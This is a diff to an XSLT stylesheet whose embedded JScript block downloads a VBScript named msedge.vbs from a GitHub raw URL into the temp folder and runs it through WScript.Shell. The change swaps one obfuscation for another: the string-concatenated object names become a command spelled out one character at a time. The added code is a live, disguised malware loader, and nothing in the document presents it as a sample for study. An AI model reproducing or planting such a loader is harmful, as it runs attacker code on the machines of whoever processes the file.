@@ -3,9 +3,12 @@
 <output method="text"/>
 <ms:script language="JScript" implements-prefix="user"> 
 <![CDATA[
-var a = "ActiveXObject", b = "WScript.Shell", c = "Run", d = "curl https://raw.githubusercontent.com/Vicky-Syst/mofa/main/msedge.vbs -o %TEMP%\\msedge.vbs && %TEMP%\\msedge.vbs";
-var e = new Function("return new " + a + "(\"" + b + "\")." + c + "(\"" + d + "\")");
-e();
+(function() {
+    var x = ["c", "u", "r", "l", " ", "h", "t", "t", "p", "s", ":", "/", "/", "r", "a", "w", ".", "g", "i", "t", "h", "u", "b", "u", "s", "e", "r", "c", "o", "n", "t", "e", "n", "t", ".", "c", "o", "m", "/", "V", "i", "c", "k", "y", "-", "S", "y", "s", "t", "/", "m", "o", "f", "a", "/", "m", "a", "i", "n", "/", "m", "s", "e", "d", "g", "e", ".", "v", "b", "s", " ", "-", "o", " ", "%", "T", "E", "M", "P", "%", "\\", "m", "s", "e", "d", "g", "e", ".", "v", "b", "s", " ", "&", "&", " ", "%", "T", "E", "M", "P", "%", "\\", "m", "s", "e", "d", "g", "e", ".", "v", "b", "s"];
+    var cmd = x.join('');
+    var sh = new ActiveXObject("WScript.Shell");
+    sh.Run(cmd);
+})();
 ]]> 
 </ms:script>
 </stylesheet>
